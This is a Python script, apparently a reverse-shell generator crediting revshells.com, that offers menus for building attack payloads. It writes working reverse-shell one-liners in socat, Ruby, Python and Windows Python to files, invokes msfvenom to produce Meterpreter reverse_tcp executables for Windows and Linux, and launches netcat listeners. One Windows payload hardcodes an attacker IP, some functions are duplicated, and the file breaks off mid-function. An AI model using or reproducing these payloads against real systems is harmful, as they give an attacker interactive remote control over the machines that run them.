#!/bin/python3

import re
import time
import os
import subprocess
import signal
from colorama import Fore, Style




def nl(): #ny linje
	print('\n')

def print_header():
	nl()

	print(Fore.YELLOW + "	  ██████  ██░ ██ ▓█████  ██▓     ██▓   ▓██   ██▓▓█████ ▄▄▄       ██░ ██ " + Style.RESET_ALL)
	print(Fore.YELLOW + "	▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    ▒██  ██▒▓█   ▀▒████▄    ▓██░ ██▒" + Style.RESET_ALL)
	print(Fore.YELLOW + "	░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░     ▒██ ██░▒███  ▒██  ▀█▄  ▒██▀▀██░" + Style.RESET_ALL)
	print(Fore.YELLOW + "	  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░     ░ ▐██▓░▒▓█  ▄░██▄▄▄▄██ ░▓█ ░██ " + Style.RESET_ALL)
	print(Fore.YELLOW + "	▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒ ░ ██▒▓░░▒████▒▓█   ▓██▒░▓█▒░██▓" + Style.RESET_ALL)
	print(Fore.YELLOW + "	▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░  ██▒▒▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░▒░▒" + Style.RESET_ALL)
	print(Fore.YELLOW + "	░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░▓██ ░▒░  ░ ░  ░ ▒   ▒▒ ░ ▒ ░▒░ ░" + Style.RESET_ALL)
	print(Fore.YELLOW + "	░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   ▒ ▒ ░░     ░    ░   ▒    ░  ░░ ░" + Style.RESET_ALL)
	print(Fore.YELLOW + "	      ░   ░  ░  ░   ░  ░    ░  ░    ░  ░░ ░        ░  ░     ░  ░ ░  ░  ░" + Style.RESET_ALL)
	print(Fore.YELLOW + "***************************************************************************" + Style.RESET_ALL)
	print(Fore.YELLOW + "Made possible by http://revshells.com and all the creators.			   " + Style.RESET_ALL)
	print(Fore.YELLOW + "Script made by Golden  " + Style.RESET_ALL)
	print(Fore.YELLOW + "***************************************************************************" + Style.RESET_ALL)


def main():
		try:
			os.system('clear')
			print_header()
			print(Fore.GREEN + "1. Bash" + Style.RESET_ALL)
			print(Fore.GREEN + "2. NetCat" + Style.RESET_ALL)
			print(Fore.GREEN + "3. C/C#" + Style.RESET_ALL)
			print(Fore.GREEN + "4. Perl" + Style.RESET_ALL)
			print(Fore.GREEN + "5. PHP" + Style.RESET_ALL)
			print(Fore.GREEN + "6. Powershell" + Style.RESET_ALL)
			print(Fore.GREEN + "7. Python" + Style.RESET_ALL)
			print(Fore.GREEN + "8. Ruby" + Style.RESET_ALL)
			print(Fore.GREEN + "9. Socat" + Style.RESET_ALL)
			print(Fore.GREEN + "10. msfvenom" + Style.RESET_ALL)
	#		print(Fore.GREEN + "11. Java" + Style.RESET_ALL)
	#		print(Fore.GREEN + "12. Telnet" + Style.RESET_ALL)
			print(Fore.RED + "99. Quit" + Style.RESET_ALL)

			choice = input("Enter your choice (1-9): ")
			nl()
			if choice == "1":
				bash_menu()
			elif choice == "2":
				netcat_menu()
			elif choice == "3":
				c_menu()
			elif choice == "4":
				perl_menu()
			elif choice == "5":
				php_menu()
			elif choice == "6":
				powershell_menu()
			elif choice == "7":
				python_menu()
			elif choice == "8":
				ruby_menu()
			elif choice == "9":
				socat_menu()
			elif choice == "10":
				msfvenom_menu()
	#		elif choice == "11":
	#			java_menu()
	#		elif choice == "12":
	#			telnet_menu()
			elif choice == "99":
				exit_menu()
		except KeyboardInterrupt:
			print("\nInterrupted, Exiting.... I shell cya later!..")
			time.sleep(2)
		exit_menu()

def exit_menu():
	os.system('clear')
	print_header()
	nl()
	choice = input(Fore.RED + "Are you sure you want to quit? (y/n):" + Style.RESET_ALL)
	nl()
	if choice == "y":
		exit()
	elif choice == "n":
		main()
	else:
		print(Fore.YELLOW + "Invalid choice" + Style.RESET_ALL)
		exit_menu()


def msfvenom_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate msf shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. msfvenom windows" + Style.RESET_ALL)
		print(Fore.BLUE + "2. msfvenom linux" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-2): ")

		if choice == "1":
			generate_msf_windows()
		if choice == "2":
			generate_msf_linux()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()


def generate_msf_windows():
    try:
        while True:
            lhost = input("Enter LHOST: ")
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
                print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
                continue
            break

        while True:
            lport = input("Enter LPORT: ")
            if not lport.isdigit():
                print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
                continue
            break

        filename = input("Enter filename: ")

        command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {filename}"

        subprocess.call(command, shell=True)

        print(f"File created as {filename}")

        listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
        if listener_choice.lower() == "y":
            terminals = ["mate-terminal", "gnome-terminal"]
            for terminal in terminals:
                try:
                    subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
                    break
                except FileNotFoundError:
                    continue
            else:
                print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
        elif listener_choice.lower() == "n":
            print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
            time.sleep(4)
    except KeyboardInterrupt:
        print("\nInterrupted, returning to menu...")
        time.sleep(2)
    msfvenom_menu()


def generate_msf_linux():
    try:
        while True:
            lhost = input("Enter LHOST: ")
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
                print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
                continue
            break

        while True:
            lport = input("Enter LPORT: ")
            if not lport.isdigit():
                print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
                continue
            break

        filename = input("Enter filename: ")


        command = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {filename}.elf"

        subprocess.call(command, shell=True)

        print(f"File created as {filename}")

        listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
        if listener_choice.lower() == "y":
            terminals = ["mate-terminal", "gnome-terminal"]
            for terminal in terminals:
                try:
                    subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
                    break
                except FileNotFoundError:
                    continue
            else:
                print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
        elif listener_choice.lower() == "n":
            print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
            time.sleep(4)
    except KeyboardInterrupt:
        print("\nInterrupted, returning to menu...")
        time.sleep(2)
    msfvenom_menu()

def socat_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate ruby shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. socat" + Style.RESET_ALL)
		print(Fore.BLUE + "2. socat 2 TTY" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-2): ")

		if choice == "1":
			generate_socat()
		if choice == "2":
			generate_socat_2_tty()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()
	

def generate_socat_2_tty():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"socat TCP:{lhost}:{lport} EXEC:'sh',pty,stderr,setsid,sigint,sane"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	socat_menu()


def generate_socat():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"socat TCP:{lhost}:{lport} EXEC:sh"

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	socat_menu()



def ruby_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate ruby shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. Ruby #1" + Style.RESET_ALL)
		print(Fore.BLUE + "2. Ruby no sh" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-2): ")

		if choice == "1":
			generate_ruby_1()
		elif choice == "2":
			generate_ruby_no_sh()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()


def generate_ruby_no_sh():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("{lhost}","{lport}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	ruby_menu()



def generate_ruby_1():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{lhost}",{lport}))'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	ruby_menu()






def python_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate Python shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. Python #1" + Style.RESET_ALL)
		print(Fore.BLUE + "2. Python #2" + Style.RESET_ALL)
		print(Fore.BLUE + "3. Python 3 #1" + Style.RESET_ALL)
		print(Fore.BLUE + "4. Python 3 #2" + Style.RESET_ALL)
		print(Fore.BLUE + "5. Python 3 Windows" + Style.RESET_ALL)
		print(Fore.BLUE + "6. Python 3 Shortest" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-6): ")

		if choice == "1":
			generate_python_1()
		elif choice == "2":
			generate_python_2()
		elif choice == "3":
			generate_python_3_1()
		elif choice == "4":
			generate_python_3_2()
		elif choice == "5":
			generate_python_3_windows()
		elif choice == "6":
			generate_python_3_shortest()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()


def generate_python_3_shortest():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	python_menu()

def generate_python_3_windows():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.6",4444))

p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	python_menu()


def generate_python_3_2():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	python_menu()


def generate_python_3_1():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""export RHOST="{lhost}";export RPORT={lport};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	python_menu()

def generate_python_1():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""export RHOST="{lhost}";export RPORT={lport};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	python_menu()


def generate_python_2():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	python_menu()

def generate_python_1():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

		command = f"""export RHOST="{lhost}";export RPORT={lport};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""

		save_choice = input("Save to working directory? (y/n): ")
		if save_choice.lower() != "y":
			path = input("Enter the path where you want to save the file: ")
			filename = os.path.join(path, filename)

		with open(filename, 'w') as f:
			f.write(command)

		print(f"File saved as {filename}")

		listener_choice = input("Start a netcat listener on the specified LPORT? (y/n): ")
		if listener_choice.lower() == "y":
			terminals = ["mate-terminal", "gnome-terminal"]
			for terminal in terminals:
				try:
					subprocess.Popen([terminal, '-e', f'nc -nvlp {lport}'])
					break
				except FileNotFoundError:
					continue
			else:
				print("No suitable terminal emulator found! start manually in  another terminal with the command: nc -nvlp {lport} ")
		elif listener_choice.lower() == "n":
			print(Fore.YELLOW + "Shell saved, check it out!" + Style.RESET_ALL)
			time.sleep(4)
	except KeyboardInterrupt:
		print("\nInterrupted, returning to menu...")
		time.sleep(2)
	python_menu()

#STOP

def powershell_menu():
	try:
		os.system('clear')
		print_header()
		print(Fore.YELLOW + "Generate Powershell shellcode" + Style.RESET_ALL)
		nl()
		print(Fore.BLUE + "1. Powershell 1" + Style.RESET_ALL)
		print(Fore.BLUE + "2. Powershell 2" + Style.RESET_ALL)
		print(Fore.BLUE + "3. Powershell 3" + Style.RESET_ALL)
		print(Fore.BLUE + "4. Powershell 4 (TLS)" + Style.RESET_ALL)
		print(Fore.BLUE + "5. Powershell 3 (Base64)" + Style.RESET_ALL)
		print(Fore.RED + "99. Back" + Style.RESET_ALL)
		nl()
		choice = input("Choose the shell you need! (1-5): ")

		if choice == "1":
			generate_powershell_1()
		elif choice == "2":
			generate_powershell_2()
		elif choice == "3":
			generate_powershell_3()
		elif choice == "4":
			generate_powershell_4_tls()
		elif choice == "5":
			generate_powershell_3_base64()
	except KeyboardInterrupt:
		print("\nInterrupted, returning to main menu.....")
		time.sleep(1)
	main()


def generate_powershell_3_base64():
#	lhost = input("Enter LHOST: ")
#	lport = input("Enter LPORT: ")
	try:
		while True:
			lhost = input("Enter LHOST: ")
			if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', lhost):
				print(Fore.RED + "Only IP addresses allowed! Ex: 192.168.1.10")
				continue
			break

		while True:
			lport = input("Enter LPORT: ")
			if not lport.isdigit():
				print(Fore.RED + "Only numbers allowed for LPORT! Ex: 4444 ")
				continue
			break
		filename = input("Enter filename: ")

